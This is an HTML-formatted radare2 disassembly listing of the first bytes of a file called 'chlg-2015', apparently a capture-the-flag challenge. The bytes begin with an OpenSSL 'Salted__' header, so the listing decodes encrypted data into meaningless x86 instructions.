&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x00000000&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;315&lt;/span&gt; &lt;span class="nx"&gt;chlg&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;pd&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="nt"&gt;r&lt;/span&gt;
           &lt;span class="nt"&gt;0x00000000&lt;/span&gt;    &lt;span class="nt"&gt;53&lt;/span&gt;           &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;ebx&lt;/span&gt;
           &lt;span class="nt"&gt;0x00000001&lt;/span&gt;    &lt;span class="nt"&gt;61&lt;/span&gt;           &lt;span class="nt"&gt;popal&lt;/span&gt;
           &lt;span class="nt"&gt;0x00000002&lt;/span&gt;    &lt;span class="nt"&gt;6c&lt;/span&gt;           &lt;span class="nt"&gt;insb&lt;/span&gt; &lt;span class="nt"&gt;byte&lt;/span&gt; &lt;span class="nt"&gt;es&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;dx&lt;/span&gt;
       &lt;span class="o"&gt;,=&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;0x00000003&lt;/span&gt;    &lt;span class="nt"&gt;7465&lt;/span&gt;         &lt;span class="nt"&gt;je&lt;/span&gt; &lt;span class="nt"&gt;0x6a&lt;/span&gt;                          &lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
       &lt;span class="o"&gt;|&lt;/span&gt;   &lt;span class="nt"&gt;0x00000005&lt;/span&gt;    &lt;span class="nt"&gt;645f&lt;/span&gt;         &lt;span class="nt"&gt;pop&lt;/span&gt; &lt;span class="nt"&gt;edi&lt;/span&gt;
       &lt;span class="o"&gt;|&lt;/span&gt;   &lt;span class="nt"&gt;0x00000007&lt;/span&gt;    &lt;span class="nt"&gt;5f&lt;/span&gt;           &lt;span class="nt"&gt;pop&lt;/span&gt; &lt;span class="nt"&gt;edi&lt;/span&gt;
       &lt;span class="o"&gt;|&lt;/span&gt;   &lt;span class="nt"&gt;0x00000008&lt;/span&gt;    &lt;span class="nt"&gt;44&lt;/span&gt;           &lt;span class="nt"&gt;inc&lt;/span&gt; &lt;span class="nt"&gt;esp&lt;/span&gt;
       &lt;span class="o"&gt;|&lt;/span&gt;   &lt;span class="nt"&gt;0x00000009&lt;/span&gt;    &lt;span class="nt"&gt;1980b6425fd4&lt;/span&gt; &lt;span class="nt"&gt;sbb&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;eax&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mh"&gt;0x2ba0bd4a&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;
       &lt;span class="o"&gt;|&lt;/span&gt;   &lt;span class="nt"&gt;0x0000000f&lt;/span&gt;    &lt;span class="nt"&gt;ff1e&lt;/span&gt;         &lt;span class="nt"&gt;lcall&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
       &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;unk&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;
       &lt;span class="o"&gt;|&lt;/span&gt;   &lt;span class="nt"&gt;0x00000011&lt;/span&gt;    &lt;span class="nt"&gt;5c&lt;/span&gt;           &lt;span class="nt"&gt;pop&lt;/span&gt; &lt;span class="nt"&gt;esp&lt;/span&gt;
       &lt;span class="o"&gt;|&lt;/span&gt;   &lt;span class="nt"&gt;0x00000012&lt;/span&gt;    &lt;span class="nt"&gt;83a1c4d724f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nt"&gt;and&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;ecx&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mh"&gt;0xadb283c&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;0x46&lt;/span&gt;
       &lt;span class="o"&gt;|&lt;/span&gt;   &lt;span class="nt"&gt;0x00000019&lt;/span&gt;    &lt;span class="nt"&gt;97&lt;/span&gt;           &lt;span class="nt"&gt;xchg&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;edi&lt;/span&gt;
       &lt;span class="o"&gt;|&lt;/span&gt;   &lt;span class="nt"&gt;0x0000001a&lt;/span&gt;    &lt;span class="nt"&gt;9aac25715f8&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nt"&gt;lcall&lt;/span&gt; &lt;span class="nt"&gt;0x648e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;0x5f7125ac&lt;/span&gt;          &lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
       &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x0000648e&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;
      &lt;span class="o"&gt;,==&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;0x00000021&lt;/span&gt;    &lt;span class="nt"&gt;e252&lt;/span&gt;         &lt;span class="nt"&gt;loop&lt;/span&gt; &lt;span class="nt"&gt;0x75&lt;/span&gt;                        &lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x00000023&lt;/span&gt;    &lt;span class="nt"&gt;ad&lt;/span&gt;           &lt;span class="nt"&gt;lodsd&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x00000024&lt;/span&gt;    &lt;span class="nt"&gt;894711&lt;/span&gt;       &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edi&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x11&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;       &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x11&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;0xc4a1835c&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x00000027&lt;/span&gt;    &lt;span class="nt"&gt;9e&lt;/span&gt;           &lt;span class="nt"&gt;sahf&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x00000028&lt;/span&gt;    &lt;span class="nt"&gt;c4ad929b6505&lt;/span&gt; &lt;span class="nt"&gt;les&lt;/span&gt; &lt;span class="nt"&gt;ebp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;ebp&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x5659b92&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x0000002e&lt;/span&gt;    &lt;span class="nt"&gt;4d&lt;/span&gt;           &lt;span class="nt"&gt;dec&lt;/span&gt; &lt;span class="nt"&gt;ebp&lt;/span&gt;
     &lt;span class="o"&gt;,===&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;0x0000002f&lt;/span&gt;    &lt;span class="nt"&gt;e2ff&lt;/span&gt;         &lt;span class="nt"&gt;loop&lt;/span&gt; &lt;span class="nt"&gt;0x30&lt;/span&gt;                        &lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x00000031&lt;/span&gt;    &lt;span class="nt"&gt;44&lt;/span&gt;           &lt;span class="nt"&gt;inc&lt;/span&gt; &lt;span class="nt"&gt;esp&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x00000032&lt;/span&gt;    &lt;span class="nt"&gt;0add&lt;/span&gt;         &lt;span class="nt"&gt;or&lt;/span&gt; &lt;span class="nt"&gt;bl&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;ch&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x00000034&lt;/span&gt;    &lt;span class="nt"&gt;d438&lt;/span&gt;         &lt;span class="nt"&gt;aam&lt;/span&gt; &lt;span class="nt"&gt;0x38&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x00000036&lt;/span&gt;    &lt;span class="nt"&gt;27&lt;/span&gt;           &lt;span class="nt"&gt;daa&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x00000037&lt;/span&gt;    &lt;span class="nt"&gt;3c4b&lt;/span&gt;         &lt;span class="nt"&gt;cmp&lt;/span&gt; &lt;span class="nt"&gt;al&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;0x4b&lt;/span&gt;                     &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;K&amp;#39;&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x00000039&lt;/span&gt;    &lt;span class="nt"&gt;8d760d&lt;/span&gt;       &lt;span class="nt"&gt;lea&lt;/span&gt; &lt;span class="nt"&gt;esi&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esi&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0xd&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;              &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0xd&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;0x1effd45f&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x0000003c&lt;/span&gt;    &lt;span class="nt"&gt;41&lt;/span&gt;           &lt;span class="nt"&gt;inc&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x0000003d&lt;/span&gt;    &lt;span class="nt"&gt;6d&lt;/span&gt;           &lt;span class="nt"&gt;insd&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;es&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;dx&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x0000003e&lt;/span&gt;    &lt;span class="nt"&gt;c883290e&lt;/span&gt;     &lt;span class="nt"&gt;enter&lt;/span&gt; &lt;span class="nt"&gt;0x2983&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;0xe&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x00000042&lt;/span&gt;    &lt;span class="nt"&gt;80141ce7&lt;/span&gt;     &lt;span class="nt"&gt;adc&lt;/span&gt; &lt;span class="nt"&gt;byte&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;ebx&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;-0x19&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x00000046&lt;/span&gt;    &lt;span class="nt"&gt;88a2b6c7cd00&lt;/span&gt; &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;byte&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0xcdc7b6&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;ah&lt;/span&gt;     &lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0xcdc7b6&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;255&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x0000004c&lt;/span&gt;    &lt;span class="nt"&gt;d8e9&lt;/span&gt;         &lt;span class="nt"&gt;fsubr&lt;/span&gt; &lt;span class="nt"&gt;st&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x0000004e&lt;/span&gt;    &lt;span class="nt"&gt;98&lt;/span&gt;           &lt;span class="nt"&gt;cwde&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x0000004f&lt;/span&gt;    &lt;span class="nt"&gt;bde40ccb76&lt;/span&gt;   &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;ebp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;0x76cb0ce4&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x00000054&lt;/span&gt;    &lt;span class="nt"&gt;4b&lt;/span&gt;           &lt;span class="nt"&gt;dec&lt;/span&gt; &lt;span class="nt"&gt;ebx&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x00000055&lt;/span&gt;    &lt;span class="nt"&gt;52&lt;/span&gt;           &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;edx&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x00000056&lt;/span&gt;    &lt;span class="nt"&gt;626e0e&lt;/span&gt;       &lt;span class="nt"&gt;bound&lt;/span&gt; &lt;span class="nt"&gt;ebp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;qword&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esi&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0xe&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x00000059&lt;/span&gt;    &lt;span class="nt"&gt;e0c9&lt;/span&gt;         &lt;span class="nt"&gt;loopne&lt;/span&gt; &lt;span class="nt"&gt;0x24&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x0000005b&lt;/span&gt;    &lt;span class="nt"&gt;66b1c8&lt;/span&gt;       &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;cl&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;-0x38&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x0000005e&lt;/span&gt;    &lt;span class="nt"&gt;c24be4&lt;/span&gt;       &lt;span class="nt"&gt;ret&lt;/span&gt; &lt;span class="nt"&gt;0xe44b&lt;/span&gt;
      &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x00000061&lt;/span&gt;    &lt;span class="nt"&gt;0ccb&lt;/span&gt;         &lt;span class="nt"&gt;or&lt;/span&gt; &lt;span class="nt"&gt;al&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;0xffffffcb&lt;/span&gt;
    &lt;span class="o"&gt;,====&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;0x00000063&lt;/span&gt;    &lt;span class="nt"&gt;764b&lt;/span&gt;         &lt;span class="nt"&gt;jbe&lt;/span&gt; &lt;span class="nt"&gt;0xb0&lt;/span&gt;                         &lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x00000065&lt;/span&gt;    &lt;span class="nt"&gt;52&lt;/span&gt;           &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;edx&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x00000066&lt;/span&gt;    &lt;span class="nt"&gt;626e0e&lt;/span&gt;       &lt;span class="nt"&gt;bound&lt;/span&gt; &lt;span class="nt"&gt;ebp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;qword&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esi&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0xe&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="nt"&gt;0x00000069&lt;/span&gt;    &lt;span class="nt"&gt;e0c9&lt;/span&gt;         &lt;span class="nt"&gt;loopne&lt;/span&gt; &lt;span class="nt"&gt;0x34&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;    &lt;span class="nt"&gt;0x0000006b&lt;/span&gt;    &lt;span class="nt"&gt;66b1c8&lt;/span&gt;       &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;cl&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;-0x38&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;    &lt;span class="nt"&gt;0x0000006e&lt;/span&gt;    &lt;span class="nt"&gt;c24b49&lt;/span&gt;       &lt;span class="nt"&gt;ret&lt;/span&gt; &lt;span class="nt"&gt;0x494b&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;    &lt;span class="nt"&gt;0x00000071&lt;/span&gt;    &lt;span class="nt"&gt;15cd03153c&lt;/span&gt;   &lt;span class="nt"&gt;adc&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;0x3c1503cd&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x00000076&lt;/span&gt;    &lt;span class="nt"&gt;52&lt;/span&gt;           &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;edx&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x00000077&lt;/span&gt;    &lt;span class="nt"&gt;10abe7c68fc8&lt;/span&gt; &lt;span class="nt"&gt;adc&lt;/span&gt; &lt;span class="nt"&gt;byte&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;ebx&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mh"&gt;0x37703919&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;ch&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x0000007d&lt;/span&gt;    &lt;span class="nt"&gt;82f198&lt;/span&gt;       &lt;span class="nt"&gt;xor&lt;/span&gt; &lt;span class="nt"&gt;cl&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;0x98&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x00000080&lt;/span&gt;    &lt;span class="nt"&gt;f1&lt;/span&gt;           &lt;span class="nt"&gt;int1&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x00000081&lt;/span&gt;    &lt;span class="nt"&gt;53&lt;/span&gt;           &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;ebx&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x00000082&lt;/span&gt;    &lt;span class="nt"&gt;28d9&lt;/span&gt;         &lt;span class="nt"&gt;sub&lt;/span&gt; &lt;span class="nt"&gt;cl&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;bl&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x00000084&lt;/span&gt;    &lt;span class="nt"&gt;ef&lt;/span&gt;           &lt;span class="nt"&gt;out&lt;/span&gt; &lt;span class="nt"&gt;dx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x00000085&lt;/span&gt;    &lt;span class="nt"&gt;43&lt;/span&gt;           &lt;span class="nt"&gt;inc&lt;/span&gt; &lt;span class="nt"&gt;ebx&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x00000086&lt;/span&gt;    &lt;span class="nt"&gt;0e&lt;/span&gt;           &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;cs&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x00000087&lt;/span&gt;    &lt;span class="nt"&gt;cc&lt;/span&gt;           &lt;span class="nt"&gt;int3&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x00000088&lt;/span&gt;    &lt;span class="nt"&gt;d38a8cc77cff&lt;/span&gt; &lt;span class="nt"&gt;ror&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edx&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mh"&gt;0x833874&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;cl&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x0000008e&lt;/span&gt;    &lt;span class="nt"&gt;53&lt;/span&gt;           &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;ebx&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x0000008f&lt;/span&gt;    &lt;span class="nt"&gt;51&lt;/span&gt;           &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x00000090&lt;/span&gt;    &lt;span class="nt"&gt;ad&lt;/span&gt;           &lt;span class="nt"&gt;lodsd&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x00000091&lt;/span&gt;    &lt;span class="nt"&gt;07&lt;/span&gt;           &lt;span class="nt"&gt;pop&lt;/span&gt; &lt;span class="nt"&gt;es&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x00000092&lt;/span&gt;    &lt;span class="nt"&gt;b6ef&lt;/span&gt;         &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;dh&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;-0x11&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x00000094&lt;/span&gt;    &lt;span class="nt"&gt;c462df&lt;/span&gt;       &lt;span class="nt"&gt;les&lt;/span&gt; &lt;span class="nt"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edx&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mh"&gt;0x21&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x00000097&lt;/span&gt;    &lt;span class="nt"&gt;fe&lt;/span&gt;           &lt;span class="nt"&gt;invalid&lt;/span&gt;
    &lt;span class="o"&gt;|&lt;/span&gt;      &lt;span class="nt"&gt;0x00000098&lt;/span&gt;    &lt;span class="nt"&gt;ad&lt;/span&gt;           &lt;span class="nt"&gt;lodsd&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
